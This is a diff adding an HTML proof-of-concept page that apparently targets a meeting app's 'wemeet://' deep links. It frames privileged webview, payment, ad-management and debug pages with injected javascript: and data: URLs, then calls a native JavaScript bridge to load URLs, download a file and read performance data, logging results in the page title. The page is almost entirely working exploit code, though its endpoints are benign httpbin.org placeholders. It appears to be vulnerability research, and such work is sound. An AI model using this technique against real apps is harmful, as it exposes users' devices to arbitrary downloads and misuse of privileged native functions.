@@ -1,0 +1,33 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P8</h1>
+<script>
+document.title='P8-START';
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+var js="javascript:(function(){document.title='P8-JS';window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='CB '+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,36)};function c(m,e,p){if(!window.JSCallJavaMgr){document.title='NOJSB';return}window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:m+'.'+e}))}setTimeout(function(){c('CommonPlugin','LoadUrl',{url:'https://httpbin.org/uuid'})},500);setTimeout(function(){c('MeetlogWebPlugin','DownloadFile',{url:'https://httpbin.org/bytes/32',fileName:'p.bin',md5:''})},1400);setTimeout(function(){c('CommonPlugin','GetPerformance',{})},2300)})()";
+var data='data:text/html;charset=utf-8,'+encodeURIComponent("<script>"+js.replace(/^javascript:/,'')+"<\/script>");
+var steps=[
+  function(){ frame('wemeet://page/webview?url='+encodeURIComponent(js),'P8-JSURI'); },
+  function(){ frame('wemeet://page/webview?url='+encodeURIComponent(data),'P8-DATA'); },
+  function(){ frame('wemeet://page/private_ad_mgt?url='+encodeURIComponent('https://httpbin.org/html'),'P8-AD'); },
+  function(){ frame('wemeet://page/pay/webview?url='+encodeURIComponent('https://httpbin.org/html'),'P8-PAY'); },
+  function(){ frame('wemeet://page/professional/webview?url='+encodeURIComponent('https://httpbin.org/html'),'P8-PRO'); },
+  function(){ frame('wemeet://page/debugsettings','P8-DBG'); },
+  function(){ frame('wemeet://page/nostateful/webview?url='+encodeURIComponent('https://httpbin.org/html'),'P8-NS'); },
+  function(){ frame('wemeet://page/stardand_webview?url='+encodeURIComponent('https://httpbin.org/html'),'P8-STD'); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ document.title='P8-DONE'; return; }
+  try{ steps[i](); }catch(e){ document.title='P8-EX'; }
+  i++;
+  setTimeout(next, 2800);
+}
+setTimeout(next, 500);
+</script>
+</body></html>
